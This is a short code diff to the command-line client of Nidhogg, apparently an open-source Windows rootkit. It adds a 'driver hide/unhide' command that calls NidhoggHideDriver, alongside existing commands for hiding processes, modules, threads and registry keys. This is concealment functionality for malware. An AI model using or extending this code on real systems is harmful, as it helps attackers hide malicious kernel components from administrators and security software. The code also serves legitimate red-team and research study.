@@ -11,6 +11,7 @@ enum class Options {
 };
 
 #define PRINT_ASCII_ART
+
 #ifdef PRINT_ASCII_ART
 constexpr const char* ASCII_ART = R"(                  
                                  8                           
@@ -44,6 +45,7 @@ void PrintUsage() {
 	std::cout << "[ * ] Possible usage:" << std::endl;
 	std::cout << "\tNidhoggClient.exe process [add | remove | clear | hide | unhide | elevate | signature | query ] [pid] [signer type] [signature signer]" << std::endl;
 	std::cout << "\tNidhoggClient.exe module [hide | unhide] [pid] [module path]" << std::endl;
+	std::cout << "\tNidhoggClient.exe driver [hide | unhide] [driver path]" << std::endl;
 	std::cout << "\tNidhoggClient.exe thread [add | remove | clear | hide | query ] [tid]" << std::endl;
 	std::cout << "\tNidhoggClient.exe file [add | remove | clear | query] [path]" << std::endl;
 	std::cout << "\tNidhoggClient.exe reg [add | remove | clear | hide | unhide | query] [key] [value]" << std::endl;
@@ -300,6 +302,10 @@ int wmain(int argc, const wchar_t* argv[]) {
 			else if (_wcsicmp(argv[1], L"module") == 0) {
 				if (argc == 5)
 					success = Nidhogg::MemoryUtils::NidhoggHideModule(hNidhogg, _wtoi(argv[3]), (wchar_t*)argv[4]);
+			}
+			else if (_wcsicmp(argv[1], L"driver") == 0) {
+				if (argc == 4)
+					success = Nidhogg::MemoryUtils::NidhoggHideDriver(hNidhogg, (wchar_t*)argv[3]);
 			}
 			else if (_wcsicmp(argv[1], L"reg") == 0) {
 				if (argc == 5) {
